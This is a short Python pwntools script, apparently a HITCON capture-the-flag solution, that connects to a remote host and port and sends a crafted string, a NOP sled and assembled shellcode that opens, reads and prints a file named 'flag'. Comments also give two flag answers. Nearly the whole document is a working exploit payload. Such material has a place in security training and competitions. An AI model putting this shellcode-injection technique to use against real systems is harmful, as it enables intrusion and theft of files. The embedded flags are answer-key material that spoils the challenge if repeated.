#!/usr/bin/env python
from pwn import *

# hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
# hitcon{take_out_all_memory,_take_away_your_soul}

context.arch = 'amd64'
host , port = '35.200.23.198' , 31733
y = remote( host , port )

kernel = open( './kernel.bin' ).read()

s = '31a-\\a:2107732+a;,' + '\x90' * 70
s += asm(
    shellcraft.pushstr( 'flag\x00' ) + 
    shellcraft.open( 'rsp' , 0 , 0 ) +
    shellcraft.read( 'rax' , 'rsp' , 0x70 ) +
    shellcraft.write( 1 , 'rsp' , 0x70 )
)


y.sendlineafter( 'down.' , s )

y.interactive()


